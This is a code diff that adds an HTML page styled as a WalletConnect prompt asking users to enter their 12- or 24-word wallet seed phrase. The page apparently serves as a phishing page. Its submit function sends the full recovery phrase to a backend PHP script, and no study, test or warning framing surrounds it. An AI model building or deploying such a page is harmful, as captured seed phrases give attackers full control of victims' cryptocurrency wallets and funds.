@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seed Phrase Input</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #121212;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin: 25px; /* Marge de 15px autour de tout le contenu */
+        }
+        .modal-content {
+            background-color: #1b1d28;
+            border: 1px solid #2c2f38;
+            border-radius: 12px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.25);
+            margin-bottom: 1rem;
+        }
+        .modal-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .modal-header img {
+            width: 2.5rem;
+            border-radius: 8px;
+        }
+        .modal-header h4 {
+            margin: 0;
+            font-size: 1.25rem;
+            color: #fff;
+        }
+        .selection-buttons {
+            display: flex;
+            background: #2a2b3d;
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 1.5rem 0;
+        }
+        .selection-buttons button {
+            flex: 1;
+            font-size: 0.9rem;
+            font-weight: 600;
+            padding: 0.75rem;
+            border: none;
+            background: transparent;
+            color: #fff;
+            cursor: pointer;
+        }
+        .selection-buttons button.active {
+            background: #3b82f6;
+        }
+        textarea {
+            width: 90%;
+            background: #2a2b3d;
+            border: 1px solid #4b5563;
+            border-radius: 8px;
+            padding: 1rem;
+            font-size: 1rem;
+            color: #fff;
+            outline: none;
+            resize: none; /* Désactive l'extension de la zone de saisie */
+            height: 150px; /* Taille fixe de la zone de saisie */
+        }
+        .words-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .word-box {
+            position: relative;
+            background: #2a2b3d;
+            border: 1px solid #4b5563;
+            border-radius: 8px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 0.9rem;
+        }
+        .word-box .index {
+            position: absolute;
+            top: -10px;
+            left: 10px;
+            background: #1a1b23;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            color: #9ca3af;
+        }
+        .submit-button {
+            width: 100%;
+            padding: 0.75rem;
+            font-size: 1rem;
+            font-weight: bold;
+            color: #fff;
+            background: #3b82f6;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .submit-button:hover {
+            background: #2563eb;
+        }
+
+        /* Mobile-friendly adjustments */
+        @media (max-width: 600px) {
+            .modal-content {
+                width: 90%;
+                padding: 1.5rem;
+            }
+            .modal-header h4 {
+                font-size: 1rem;
+            }
+            .selection-buttons button {
+                font-size: 0.8rem;
+            }
+            .words-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .word-box {
+                font-size: 0.8rem;
+                height: 40px;
+            }
+            .submit-button {
+                font-size: 0.9rem;
+                padding: 0.65rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="modal-content">
+        <div class="modal-header">
+            <img src="wallet-connect-logo.svg" alt="Icon">
+            <h4>Enter Seed Phrase</h4>
+        </div>
+        <div class="selection-buttons">
+            <button class="active" onclick="setWords(12)">12 words</button>
+            <button onclick="setWords(24)">24 words</button>
+        </div>
+        <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." oninput="updateWords(this.value)" id="seedPhraseTextarea"></textarea>
+        <div class="words-grid" id="wordsGrid">
+            <!-- Word boxes dynamically generated -->
+        </div>
+        <button class="submit-button" onclick="submitSeedPhrase()">Submit</button>
+        <!-- Zone pour afficher les données -->
+        <div id="output"></div>
+    </div>
+
+    <script>
+        let wordCount = 12; // Default to 12 words
+
+        function setWords(count) {
+            wordCount = count;
+
+            const buttons = document.querySelectorAll('.selection-buttons button');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            buttons[count === 12 ? 0 : 1].classList.add('active');
+
+            renderWordBoxes();
+        }
+
+        function renderWordBoxes() {
+            const grid = document.getElementById('wordsGrid');
+            grid.innerHTML = ''; // Clear grid
+            for (let i = 1; i <= wordCount; i++) {
+                const wordBox = document.createElement('div');
+                wordBox.className = 'word-box';
+                wordBox.innerHTML = `<div class="index">${i}</div><span class="word"></span>`;
+                grid.appendChild(wordBox);
+            }
+        }
+
+        function updateWords(input) {
+            const words = input.split(' '); // Split the input by spaces
+            const wordBoxes = document.querySelectorAll('.word-box .word');
+            
+            // Update each word box with the corresponding word
+            wordBoxes.forEach((box, index) => {
+                box.textContent = words[index] || ''; // Set word or clear if none
+            });
+        }
+
+        function submitSeedPhrase() {
+            // Récupérer la valeur de la zone de texte
+            const seedPhrase = document.getElementById('seedPhraseTextarea').value;
+
+            // Envoi des données au backend PHP avec fetch
+            fetch('submitSeedPhrase.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `seedPhrase=${encodeURIComponent(seedPhrase)}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                const output = document.getElementById('output');
+                output.textContent = data.message;
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        // Initialize with 12 words
+        setWords(12);
+    </script>
+</body>
+</html>
